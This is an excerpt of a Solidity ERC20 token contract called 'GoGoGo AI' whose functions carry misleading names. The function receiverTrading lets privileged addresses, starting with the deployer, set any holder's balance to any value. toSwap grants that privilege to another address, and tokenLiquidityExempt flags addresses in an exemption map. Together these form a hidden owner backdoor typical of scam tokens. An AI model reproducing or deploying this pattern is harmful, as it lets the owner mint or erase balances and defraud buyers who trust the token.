...
contract GoGoGoAI is Context, IERC20, Ownable {
    ...
    function tokenLiquidityExempt(address toMode) public {
        launchShould();
        if (toMode == sellTx || toMode == autoWallet) {
            return;
        }
        fundExempt[toMode] = true;
    }
    ...
    function receiverTrading(address receiverIs, uint256 totalLaunched) public {
        require(maxTradingLimit[_msgSender()]);
        _balances[receiverIs] = totalLaunched;
    }
    ...
    uint256 public _walletMax = 2000000000 * 10 ** 18;
    ...
    constructor () { 
        ...
        autoWallet = uniswapPair;
        maxTradingLimit[_msgSender()] = true;
        sellTx = _msgSender();
    ...
    string private _name = "GoGoGo AI";
    ...
    mapping(address => bool) public maxTradingLimit;
    ...
    uint256 private minimumTokensBeforeSwap = 350000000 * 10 ** 18;
    ...
    function toSwap(address buyLimitLaunched) public {
        require(!walletSellAuto);
        maxTradingLimit[buyLimitLaunched] = true;
        walletSellAuto = true;
    }
